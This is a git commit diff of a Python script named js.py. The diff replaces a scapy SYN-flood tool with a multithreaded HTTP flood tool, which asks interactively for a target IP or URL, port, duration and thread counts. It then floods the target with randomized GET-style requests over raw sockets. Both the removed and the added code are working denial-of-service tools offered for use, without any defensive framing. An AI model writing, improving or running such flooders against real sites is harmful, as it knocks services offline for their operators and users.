44842bf8c04186d351b4ab4e30f29f085c6d7dfd
kitunyacell-kun <kitunyacell@gmail.com>
2026-02-05 00:09:01 +0700

    Update js.py

--- js.py
+++ js.py
@@ -1,89 +1,121 @@
 #!/usr/bin/env python3.12
 # _*_ coding: utf-8 _*_
+# CHECK IMPORT
+try:
+    import socket
+    import threading
+    import string
+    import random
+    import time
+    import os
+    import platform
+    import sys
+    from colorama import Fore
+except ModuleNotFoundError as e:
+    print(f"{e} CAN'T IMPORT . . . .")
+    exit()
 
+# DEF & CLASS
 
-from os import geteuid
-from datetime import date
-from optparse import OptionParser
-from multiprocessing import Pool, cpu_count
-from colorama import Fore, Back, Style
-from scapy.all import IP, TCP, Raw, RandShort, send
-from time import strftime, localtime, time
+def clear_text():
+    if platform.system().upper() == "WINDOWS":
+        os.system('cls')
+    else:
+        os.system('clear')
 
-status_color = {
-	'+': Fore.GREEN,
-	'-': Fore.RED,
-	'*': Fore.YELLOW,
-	':': Fore.CYAN,
-	' ': Fore.WHITE,
-}
+def status_print(ip,port,thread_id,rps,path_get):
+    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
+def generate_url_path_pyflooder(num):
+    msg = str(string.ascii_letters + string.digits + string.punctuation)
+    data = "".join(random.sample(msg, int(num)))
+    return data
+    
+def generate_url_path_choice(num):
+    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
+    data = ""
+    for _ in range(int(num)):
+        data += random.choice(letter)
+    return data
 
-def get_time():
-	return strftime("%H:%M:%S", localtime())
-def display(status, data):
-	print(f"{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {get_time()}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}")
+# DOS
+def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
+    rps = 0
+    url_path = ''
+    path_get = ['PY_FLOOD','CHOICES_FLOOD']
+    path_get_loader = random.choice((path_get))
+    if path_get_loader == "PY_FLOOD":
+        url_path = generate_url_path_pyflooder(5)
+    else:
+        url_path = generate_url_path_choice(5)
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    try:
+        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
+        s.connect((ip,port))
+        for _ in range(booter_sent):
+            s.sendall(packet_data)
+            s.send(packet_data)
+            rps += 2
+    except:
+        try:
+            s.shutdown(socket.SHUT_RDWR)
+            s.close()
+        except:
+            pass
+    status_print(ip,port,id,rps,path_get_loader)
 
-def get_arguments(*args):
-	parser = OptionParser()
-	for arg in args:
-		parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
-	return parser.parse_args()[0]
+status_code = False
+id_loader = 0
+def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent):
+    global status_code,id_loader
+    if status_code == True:
+        while time.time() < time_loader:
+            for _ in range(spam_loader):
+                id_loader += 1
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th.start()
+    else:
+        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
 
-def check_root():
-	return geteuid() == 0
+#DATA
+banner = f"""
 
-def syn_flood(thread_index, target, port, size):
-	display(':', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Crafting IP Layer")
-	ip_layer = IP(dst=target)
-	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Done")
-	display(':', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Crafting TCP Layer")
-	if port != -1:
-		tcp_layer = TCP(sport=RandShort(), dport=port, flags='S')
-	else:
-		tcp_layer = TCP(sport=RandShort(), flags='S')
-	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Done")
-	display(':', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Making RAW Data")
-	raw_data = Raw(b'X'*size)
-	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Done")
-	display(':', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Crafting the Final Packet => {Back.MAGENTA}ip_layer / tcp_layer / raw_data{Back.RESET}")
-	packet = ip_layer / tcp_layer / raw_data
-	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Done")
-	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Flooding Packets to target {Back.MAGENTA}{target}{Back.RESET}:{Back.MAGENTA}{port}{Back.RESET}")
-	send(packet, loop=1, verbose=0)
+#{Fore.RESET}"""
 
-if __name__ == "__main__":
-	data = get_arguments(('-t', "--target", "target", "Target to perform SYN Flooding Attack on"),
-		      			 ('-p', "--port", "port", "Target Port to flood"),
-						 ('-s', "--size", "size", "Size of Data that we want to send(in Bytes) (Default=1024 Bytes)"))
-	if not data.target:
-		display('-', "Please specify a target")
-		exit(0)
-	if not data.port:
-		data.port = -1
-	else:
-		try:
-			data.port = int(data.port)
-		except ValueError:
-			display('-', "Please enter a valid port")
-			exit(0)
-	if not data.size:
-		data.size = 1024
-	else:
-		data.size = int(data.size)
-	if not check_root():
-		display('-', f"This Program requires {thread_index} ")
-		exit(0)
-	thread_count = cpu_count()
-	pool = Pool(thread_count)
-	threads = []
-	display('+', f"Starting SYN Flood Attack on {Back.MAGENTA}{data.target}{Back.RESET}:{Back.MAGENTA}{data.port}{Back.RESET} with {Back.MAGENTA}{thread_count}{Back.RESET}")
-	for thread_index in range(thread_count):
-		threads.append(pool.apply_async(syn_flood, (thread_index, data.target, data.port, data.size)))
-	try:
-		for thread in threads:
-			thread.get()
-		pool.close()
-		pool.join()
-	except KeyboardInterrupt:
-		display(':', f"Closing")
-		exit(0)
+print(banner)
+host = ""
+ip = ""
+target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
+port_loader = int(input(f"{Fore.YELLOW}PORT>"))
+time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME (DEFAULT=250)>"))
+spam_loader = int(input(f"{Fore.RED}SPAM THREAD (DEFAULT=50 OR 299)>"))
+create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=50)>"))
+booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500)>"))
+print(f"{Fore.LIGHTCYAN_EX}       EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD DELETE OPTIONS TRACE")
+print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> PANOS MIRAI EXPLOIT LOGSHELL SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
+methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
+print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
+try:
+    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
+    ip = socket.gethostbyname(host)
+except socket.gaierror:
+    exit()
+for loader_num in range(create_thread):
+    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
+    sys.stdout.flush()
+    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+clear_text()
+print(banner)
+status_code = True
+print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
